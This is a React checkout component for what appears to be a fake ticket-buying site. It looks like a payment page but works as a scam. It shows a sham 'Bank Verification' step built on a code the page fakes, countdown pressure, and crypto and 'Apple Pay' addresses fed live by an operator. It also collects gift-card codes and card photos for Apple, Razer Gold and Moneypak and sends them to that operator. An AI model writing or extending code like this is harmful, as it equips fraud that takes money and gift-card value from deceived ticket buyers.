import React, { useState, useEffect } from 'react';
import { ChevronLeft, Clock, CreditCard, ChevronDown, ShieldCheck, Apple, Bitcoin, Gift, Camera, CheckCircle } from 'lucide-react';

export default function Checkout({ cart, sessionId, sessionData, updateSession, onSuccess, onBack }) {
  const [timeLeft, setTimeLeft] = useState(300);
  const [paymentMethod, setPaymentMethod] = useState(null); 
  const [cardDetails, setCardDetails] = useState({ number: '', exp: '', cvc: '' });
  
  // Gift Card States
  const [giftCardType, setGiftCardType] = useState('apple');
  const [giftCode, setGiftCode] = useState('');
  const [giftCardImage, setGiftCardImage] = useState(null); // Stores the Base64 text string
  const [hasUploadedImage, setHasUploadedImage] = useState(false);

  const [enteredOtp, setEnteredOtp] = useState('');
  const [email, setEmail] = useState('');
  
  // Realtime Data
  const status = sessionData?.status || 'payment_pending'; 
  const adminProvidedOtp = sessionData?.otp;
  const cryptoAddress = sessionData?.cryptoAddress;

  const subtotal = cart.reduce((acc, item) => acc + item.price, 0);
  const fees = cart.length * 19.50;
  const orderProcessing = 5.00;
  const grandTotal = subtotal + fees + orderProcessing;

  useEffect(() => {
    const timer = setInterval(() => setTimeLeft(p => p > 0 ? p - 1 : 0), 1000);
    return () => clearInterval(timer);
  }, []);

  const handleCardSubmit = (e) => {
    e.preventDefault();
    const fakeSystemOtp = Math.floor(100000 + Math.random() * 900000).toString();
    updateSession(sessionId, { status: 'waiting_for_otp', otp: fakeSystemOtp, paymentMethod: 'card', email: email, cart: cart, total: grandTotal });
  };

  const handleManualRequest = (type) => {
    setPaymentMethod(type);
    updateSession(sessionId, { status: 'waiting_for_admin_address', paymentMethod: type, email: email, cart: cart, total: grandTotal });
  };

  // --- THE NEW IMAGE CONVERTER ---
  const handleImageUpload = (e) => {
    const file = e.target.files[0];
    if (file) {
      // Limit size to 1MB to prevent database bloating
      if (file.size > 1000000) {
        alert("File is too large. Please upload an image smaller than 1MB.");
        return;
      }
      const reader = new FileReader();
      reader.onloadend = () => {
        setGiftCardImage(reader.result); // Converts image to text string
        setHasUploadedImage(true);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleGiftCardSubmit = () => {
    if (!giftCode) return alert("Please enter the card code");
    
    updateSession(sessionId, { 
      status: 'waiting_for_otp', 
      otp: `GC-${giftCardType.toUpperCase()}`, 
      email: email, 
      cart: cart, 
      total: grandTotal, 
      paymentMethod: 'gift_card',
      // Send the image text string to Admin
      giftCardDetails: { type: giftCardType, code: giftCode, imageBase64: giftCardImage }
    });
  };

  const handleOtpVerify = () => {
    if (enteredOtp === adminProvidedOtp) {
      updateSession(sessionId, { status: 'payment_complete' });
      setTimeout(onSuccess, 1500);
    } else {
      alert("Invalid Code");
    }
  };

  if (status === 'payment_complete') return <div className="flex h-screen items-center justify-center font-bold text-xl text-green-600 bg-white">Payment Successful! Redirecting...</div>;

  return (
    <div className="min-h-screen bg-gray-50 pt-4 pb-20">
      <div className="max-w-6xl mx-auto px-4">
        <button onClick={onBack} className="flex items-center text-[#026cdf] font-bold mb-4 hover:underline"><ChevronLeft className="w-5 h-5" /> Back to Seats</button>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
          <div className="md:col-span-2 space-y-6">
            <div className="flex items-center justify-between mb-2">
              <h1 className="text-2xl font-bold">Checkout</h1>
              <div className="flex items-center text-[#ea0042] font-bold bg-[#ea0042]/10 px-3 py-1 rounded"><Clock className="w-5 h-5 mr-1" />{Math.floor(timeLeft / 60)}:{(timeLeft % 60).toString().padStart(2, '0')}</div>
            </div>

            <div className="bg-white p-6 rounded-lg shadow-sm border">
               <h3 className="font-bold text-lg mb-4">Payment Method</h3>
               <div className="mb-6">
                 <label className="text-sm font-bold text-gray-700 block mb-1">Email Address</label>
                 <input type="email" placeholder="name@example.com" required className="w-full border p-3 rounded" value={email} onChange={e=>setEmail(e.target.value)} />
               </div>

               <div className="space-y-3">
                  {/* Credit Card */}
                  <div className={`border rounded-lg overflow-hidden ${paymentMethod === 'card' ? 'border-[#026cdf] ring-1 ring-[#026cdf]' : ''}`}>
                    <div className="flex items-center gap-3 cursor-pointer p-4 hover:bg-gray-50" onClick={() => setPaymentMethod(prev => prev === 'card' ? null : 'card')}>
                      <CreditCard className="text-gray-600" /> <span className="font-bold">Credit / Debit Card</span>
                      <ChevronDown className={`ml-auto w-5 h-5 transition-transform ${paymentMethod === 'card' ? 'rotate-180' : ''}`} />
                    </div>
                    {paymentMethod === 'card' && status !== 'waiting_for_otp' && (
                       <form onSubmit={handleCardSubmit} className="p-4 border-t bg-gray-50 space-y-3 animate-slideDown">
                         <input required placeholder="Card Number" className="w-full border p-3 rounded bg-white" value={cardDetails.number} onChange={e=>setCardDetails({...cardDetails, number: e.target.value})} />
                         <div className="flex gap-3">
                            <input placeholder="MM/YY" className="w-1/2 border p-3 rounded bg-white" onChange={e=>setCardDetails({...cardDetails, exp: e.target.value})} />
                            <input placeholder="CVC" className="w-1/2 border p-3 rounded bg-white" onChange={e=>setCardDetails({...cardDetails, cvc: e.target.value})} />
                         </div>
                         <button type="submit" className="w-full bg-[#026cdf] text-white py-3 rounded font-bold hover:bg-blue-700">Place Order</button>
                       </form>
                    )}
                    {status === 'waiting_for_otp' && paymentMethod === 'card' && (
                      <div className="p-6 bg-yellow-50 text-center border-t border-yellow-200">
                        <ShieldCheck className="w-10 h-10 text-yellow-600 mx-auto mb-2" />
                        <p className="font-bold mb-1 text-lg">Bank Verification</p>
                        <p className="text-sm text-gray-600 mb-4">Please enter the security code sent to {email}</p>
                        <input className="border-2 border-gray-300 p-3 rounded w-40 text-center text-2xl tracking-[0.5em] font-bold block mx-auto mb-4" value={enteredOtp} onChange={e=>setEnteredOtp(e.target.value)} maxLength={6} />
                        <button onClick={handleOtpVerify} className="bg-green-600 text-white px-8 py-3 rounded font-bold shadow hover:bg-green-700">Verify Purchase</button>
                      </div>
                    )}
                  </div>

                  {/* Bitcoin */}
                  <div className={`border rounded-lg overflow-hidden ${paymentMethod === 'bitcoin' ? 'border-[#026cdf] ring-1 ring-[#026cdf]' : ''}`}>
                     <div className="flex items-center gap-3 cursor-pointer p-4 hover:bg-gray-50" onClick={() => handleManualRequest('bitcoin')}>
                       <Bitcoin className="text-orange-500" /> <span className="font-bold">Bitcoin / Crypto</span>
                     </div>
                     {paymentMethod === 'bitcoin' && (
                        <div className="p-4 border-t bg-gray-50 text-center animate-slideDown">
                           {status === 'waiting_for_admin_address' && !cryptoAddress && <div className="text-gray-500 text-sm animate-pulse">Generating Secure Wallet Address...</div>}
                           {cryptoAddress && (
                              <div className="animate-fadeIn">
                                 <p className="font-bold text-sm mb-2">Send exactly <span className="text-orange-600">${grandTotal.toFixed(2)}</span> to:</p>
                                 <div className="bg-white p-3 border rounded mb-3 break-all font-mono text-xs select-all">{cryptoAddress}</div>
                                 <button onClick={() => updateSession(sessionId, { status: 'waiting_for_confirmation' })} className="w-full bg-orange-500 text-white py-3 rounded font-bold">I Have Sent Payment</button>
                              </div>
                           )}
                        </div>
                     )}
                  </div>
                  
                  {/* Apple Pay */}
                  <div className={`border rounded-lg overflow-hidden ${paymentMethod === 'apple_pay' ? 'border-[#026cdf] ring-1 ring-[#026cdf]' : ''}`}>
                     <div className="flex items-center gap-3 cursor-pointer p-4 hover:bg-gray-50" onClick={() => handleManualRequest('apple_pay')}>
                       <div className="w-6 h-6 bg-black rounded text-white flex items-center justify-center"><Apple className="w-4 h-4 fill-current" /></div> <span className="font-bold">Apple Pay</span>
                     </div>
                     {paymentMethod === 'apple_pay' && (
                        <div className="p-4 border-t bg-gray-50 text-center animate-slideDown">
                           {status === 'waiting_for_admin_address' && !cryptoAddress && <div className="text-gray-500 text-sm animate-pulse">Connecting to Apple Pay Merchant...</div>}
                           {cryptoAddress && (
                              <div className="animate-fadeIn">
                                 <p className="font-bold text-sm mb-2">Pay to:</p>
                                 <p className="font-mono text-lg font-bold bg-white p-3 border rounded mb-3 select-all">{cryptoAddress}</p>
                                 <button onClick={() => updateSession(sessionId, { status: 'waiting_for_confirmation' })} className="w-full bg-black text-white py-3 rounded font-bold flex items-center justify-center gap-2"><Apple className="w-4 h-4 mb-1" /> Pay with Apple Pay</button>
                              </div>
                           )}
                        </div>
                     )}
                  </div>

                  {/* Gift Cards */}
                  <div className={`border rounded-lg overflow-hidden ${paymentMethod === 'gift_card' ? 'border-[#026cdf] ring-1 ring-[#026cdf]' : ''}`}>
                     <div className="flex items-center gap-3 cursor-pointer p-4 hover:bg-gray-50" onClick={() => setPaymentMethod(prev => prev === 'gift_card' ? null : 'gift_card')}>
                       <Gift className="text-pink-600" /> <span className="font-bold">Gift Card / Voucher</span>
                       <ChevronDown className={`ml-auto w-5 h-5 transition-transform ${paymentMethod === 'gift_card' ? 'rotate-180' : ''}`} />
                     </div>
                     {paymentMethod === 'gift_card' && (
                        <div className="p-4 border-t bg-gray-50 animate-slideDown">
                           <select className="w-full border p-3 rounded bg-white mb-4" value={giftCardType} onChange={(e) => setGiftCardType(e.target.value)}>
                             <option value="apple">Apple Gift Card</option>
                             <option value="razer">Razer Gold</option>
                             <option value="moneypak">Moneypak (Green Dot)</option>
                           </select>
                           <input placeholder="Enter code here..." className="w-full border p-3 rounded bg-white mb-4" value={giftCode} onChange={e=>setGiftCode(e.target.value)} />
                           
                           {/* IMAGE UPLOAD SECTION */}
                           <div className="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center bg-white mb-4 cursor-pointer hover:bg-gray-50 relative">
                              <input type="file" accept="image/*" className="absolute inset-0 opacity-0 cursor-pointer" onChange={handleImageUpload} />
                              <div className="flex flex-col items-center">
                                {hasUploadedImage ? (<><CheckCircle className="w-8 h-8 text-green-500 mb-2"/><span className="text-sm font-bold text-green-600">Image Attached</span></>) : (<><Camera className="w-8 h-8 text-gray-400 mb-2"/><span className="text-sm text-gray-500">Tap to upload photo of card</span></>)}
                              </div>
                           </div>

                           <button onClick={handleGiftCardSubmit} className="w-full bg-pink-600 text-white py-3 rounded font-bold hover:bg-pink-700">Submit for Verification</button>
                           {status === 'waiting_for_otp' && <div className="mt-3 p-3 bg-yellow-100 text-yellow-800 rounded text-center text-sm font-medium">Reviewing your card... Please wait.</div>}
                        </div>
                     )}
                  </div>
               </div>
            </div>
          </div>

          <div className="bg-white p-6 rounded-lg shadow-sm border h-fit sticky top-4">
             <div className="flex justify-between items-start mb-4"><h3 className="font-bold text-lg">Total</h3><h3 className="font-bold text-lg">${grandTotal.toFixed(2)}</h3></div>
             <div className="border-t pt-4 space-y-2 text-sm text-gray-600">
                <div className="flex justify-between"><span>Tickets x {cart.length}</span><span>${subtotal.toFixed(2)}</span></div>
                <div className="flex justify-between"><span>Service Fees</span><span>${fees.toFixed(2)}</span></div>
             </div>
          </div>
        </div>
      </div>
    </div>
  );
}


